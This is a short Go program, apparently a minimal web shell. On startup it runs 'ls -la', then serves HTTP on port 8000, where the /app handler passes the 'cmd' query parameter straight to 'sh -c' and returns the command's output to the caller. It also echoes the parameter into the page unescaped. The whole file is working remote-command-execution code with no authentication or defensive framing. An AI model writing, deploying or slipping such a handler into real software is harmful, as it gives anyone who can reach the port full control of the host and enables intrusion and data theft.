package main
import (
	"fmt"
	"os/exec"
	"runtime"
	"net/http"
)

func execute() {
    out, err := exec.Command("sh", "-c","ls -la").Output()
    if err != nil {
        fmt.Printf("%s", err)
    }
    fmt.Println("Command Successfully Executed")
    output := string(out[:])
    fmt.Println(output)
}

func exechttp(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintf(w, "Hello %s\n", r.URL.Query().Get("cmd"))
	//fmt.Fprintf(w, "Parameter was %s\n", r.URL.Query().Get("cmd"))
	out, err := exec.Command("sh", "-c",r.URL.Query().Get("cmd")).Output()
	if err != nil {
        fmt.Printf("%s", err)
	}
	output := string(out[:])
	fmt.Fprintf(w, "Hello %s\n", output)

}


func main()  {
	if runtime.GOOS == "windows" {
        fmt.Println("Can't Execute this on a windows machine")
    } else {
        execute()
	}
	http.HandleFunc("/app", exechttp)
	http.ListenAndServe(":8000", nil)
}